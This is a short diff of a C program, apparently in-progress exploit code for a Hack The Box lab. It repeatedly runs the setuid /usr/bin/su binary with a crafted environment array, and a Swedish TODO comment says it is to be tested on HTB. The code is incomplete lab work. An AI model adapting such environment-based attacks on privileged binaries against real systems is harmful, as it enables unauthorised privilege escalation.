@@ -74,28 +74,11 @@ int main(int argc, char* argv[]){
 		//printf("INDEX %d --> %s",i, envp[i]);
 	}
 	char *moist[] = {"/usr/bin/su", "--help", NULL};
-	//pid_t pid = execve(moist[0], moist, envp);
-	int pid;
+	
 	for (int i = 0; i <= 2730; i++)
 	{
-		if ((pid = fork()) < 0)
-		{
-			printf("Fork error");
-			return 0;
-		}
-		else if ((pid = fork()) == 0)
-		{
-			int fd = open("/dev/null", O_WRONLY);
-				dup2(fd, 1);    /* make stdout a copy of fd (> /dev/null) */
-				dup2(fd, 2);    /* ...and same with stderr */
-			 	close(fd);      /* close fd */
-				execve(moist[0], moist, envp);
-		}
-		else
-		{
-			printf("Parent process...");
-		}
-
+		printf("i = %d\n",i);
+		execve(moist[0], moist, envp);
 	}
 	//TODO kopiera in resten av kod så fullständig envp går att läsa -  alltså den fullständiga strängen. Testa sedan manuellt på HTB
 	return 0;
